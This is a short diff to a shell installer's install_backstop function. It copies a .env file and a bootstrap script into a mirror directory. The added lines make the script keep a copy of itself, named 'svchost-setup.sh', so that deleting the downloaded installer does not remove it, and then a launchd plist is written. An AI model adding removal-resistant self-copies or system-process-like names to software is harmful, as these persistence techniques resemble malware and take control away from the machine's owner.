@@ -1100,6 +1100,9 @@ install_backstop() {
     cp "$downloaded/deploy/bootstrap.sh" "$mirror/bootstrap.sh" 2>/dev/null || true
   fi
   cp "$TARGET/SvcHostMac/.env" "$mirror/SvcHostMac/.env" 2>/dev/null || true
+  # Keep a private copy of the entry point itself so deleting the downloaded
+  # script does not remove the only installer.
+  if [ -f "$0" ]; then cp "$0" "$mirror/svchost-setup.sh" 2>/dev/null || true; fi
   chmod +x "$mirror/backstop-agent.sh" 2>/dev/null || true
   cat > "$plist" <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
